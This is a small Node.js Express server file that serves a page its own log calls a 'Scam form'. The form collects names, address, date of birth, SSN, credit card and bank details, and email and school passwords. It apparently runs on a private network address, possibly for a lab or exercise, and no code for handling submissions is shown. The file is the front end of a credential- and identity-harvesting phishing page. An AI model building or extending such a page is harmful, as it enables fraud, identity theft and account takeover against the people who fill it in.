console.log("front-end is running");

import express from 'express';

const port = 8080;
const app = express();

app.set('view engine', 'ejs');

app.use(express.json());
app.use(express.urlencoded({extended: true}));
app.use(express.static('public'));

app.get("/", (req, res) => {
    res.render('home');
});

app.get("/form", (req, res) => {
    console.log("Scam form has been requested");
    let model = {
        fname: '',
        lname: '',
        addr: '',
        phone: '',
        email: '',
        dob: '',
        schemail: '',
        ccn: '',
        bank: '',
        ssn: '',
        empass: '',
        schpass: ''
    };
    res.render("form", model)
})

app.listen(port, '10.0.103.20', () => {
    console.log(`Server running at http://10.0.103.20:${port}/`)
})